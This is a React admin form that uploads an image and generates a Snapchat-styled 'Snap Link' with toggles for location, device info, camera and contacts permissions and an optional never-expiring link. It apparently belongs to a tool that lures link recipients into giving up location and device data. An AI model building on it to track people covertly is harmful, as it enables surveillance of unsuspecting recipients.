// components/admin/ImageUploadForm.tsx
import React, { useState } from "react";
import Image from "next/image";
import { Input } from "@/components/ui/Input";
import { Button } from "@/components/ui/Button";
import { PermissionSelector } from "@/components/admin/PermissionSelector";
import { UploadCloud, Sparkles } from "lucide-react";
import { PermissionsConfig } from "@/lib/types";

interface ImageUploadFormProps {
  onSubmit: (data: FormData) => Promise<void>;
  isLoading: boolean;
  error: string | null;
}

export const ImageUploadForm: React.FC<ImageUploadFormProps> = ({ onSubmit, isLoading, error }) => {
  const [file, setFile] = useState<File | null>(null);
  const [preview, setPreview] = useState<string | null>(null);
  const [title, setTitle] = useState("");
  const [description, setDescription] = useState("");
  const [expiresHours, setExpiresHours] = useState("24");
  const [validationError, setValidationError] = useState<string | null>(null);
  const [permissions, setPermissions] = useState<PermissionsConfig>({
    location: true,
    device_info: true,
    camera: false,
    contacts: false,
  });

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const selected = e.target.files?.[0];
    if (selected) {
      if (selected.size > 10 * 1024 * 1024) {
        setValidationError("File size exceeds maximum 10MB limit");
        return;
      }
      setFile(selected);
      setPreview(URL.createObjectURL(selected));
      setValidationError(null);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!file) {
      setValidationError("Please select an image to upload");
      return;
    }
    const formData = new FormData();
    formData.append("file", file);
    formData.append("title", title);
    formData.append("description", description);
    formData.append("requires_location", String(permissions.location));
    formData.append("permissions_config", JSON.stringify(permissions));
    if (expiresHours !== "0") formData.append("expires_in_hours", expiresHours);
    onSubmit(formData);
  };

  const displayError = validationError || error;

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      {displayError && (
        <div className="p-3 bg-red-500/15 border border-red-500/30 rounded-2xl text-xs text-red-300">
          {displayError}
        </div>
      )}

      {/* Drag & Drop / File Input */}
      <div className="relative border-2 border-dashed border-white/15 hover:border-[#FFFC00]/50 rounded-3xl p-6 text-center cursor-pointer transition-all bg-white/[0.02]">
        <input
          type="file"
          accept="image/*"
          onChange={handleFileChange}
          className="absolute inset-0 opacity-0 cursor-pointer"
        />
        {preview ? (
          <div className="relative w-40 h-48 mx-auto rounded-2xl overflow-hidden border border-white/20">
            <Image src={preview} alt="Preview" fill className="object-cover" />
          </div>
        ) : (
          <div className="space-y-2">
            <UploadCloud className="w-10 h-10 text-[#FFFC00] mx-auto" />
            <p className="text-sm font-bold text-white">Click or drag image here</p>
            <p className="text-xs text-white/40">JPG, PNG, WEBP or GIF (Max 10MB)</p>
          </div>
        )}
      </div>

      <Input label="Snap Title" value={title} onChange={(e) => setTitle(e.target.value)} placeholder="e.g. Secret Beach Sunset" />
      <Input label="Description (Optional)" value={description} onChange={(e) => setDescription(e.target.value)} placeholder="Add optional details..." />

      {/* Granular Permissions Selector */}
      <PermissionSelector config={permissions} onChange={setPermissions} />

      <div className="p-3 rounded-2xl bg-[#1C1C22] border border-white/10">
        <label className="text-xs font-bold text-white block mb-1">Link Expiration</label>
        <select
          value={expiresHours}
          onChange={(e) => setExpiresHours(e.target.value)}
          className="w-full bg-transparent text-xs text-white outline-none cursor-pointer"
        >
          <option value="1" className="bg-black">1 Hour</option>
          <option value="24" className="bg-black">24 Hours</option>
          <option value="168" className="bg-black">7 Days</option>
          <option value="0" className="bg-black">Never Expires</option>
        </select>
      </div>

      <Button type="submit" isLoading={isLoading} size="lg" className="w-full mt-2">
        <Sparkles className="w-4 h-4 mr-2" />
        Generate Snap Link
      </Button>
    </form>
  );
};
